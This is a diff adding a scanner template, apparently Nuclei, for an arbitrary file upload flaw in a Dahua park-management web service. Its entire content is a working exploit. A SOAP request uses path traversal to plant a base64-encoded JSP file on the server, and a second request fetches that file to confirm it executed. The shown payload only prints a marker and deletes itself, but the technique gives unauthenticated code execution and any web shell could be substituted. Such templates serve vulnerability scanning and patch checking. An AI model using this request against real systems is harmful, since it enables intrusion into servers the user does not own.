@@ -1,0 +1,40 @@
+id: Dahua_WPMS_bitmap_upload
+info:
+  name: Dahua_zhihuiyuanqu_bitmap_upload
+  author: pitaya
+  severity: high
+
+variables:
+  filename: "{{to_lower(rand_base(20))}}"
+
+requests:
+  - raw:
+      - |-
+        POST /emap/webservice/gis/soap/bitmap HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+         
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
+        <soapenv:Header/>           
+        <soapenv:Body>
+        <res:uploadPicFile>
+        <arg0>
+        <picPath>/../{{filename}}.jsp</picPath>
+        </arg0>
+        <arg1>PCUgb3V0LnByaW50bG4oIlNlY0V4cGxvcmVyNjY2Iik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</arg1>
+        </res:uploadPicFile>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        
+      - |-
+        GET /upload/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains_all(body_2, "SecExplorer666")'    
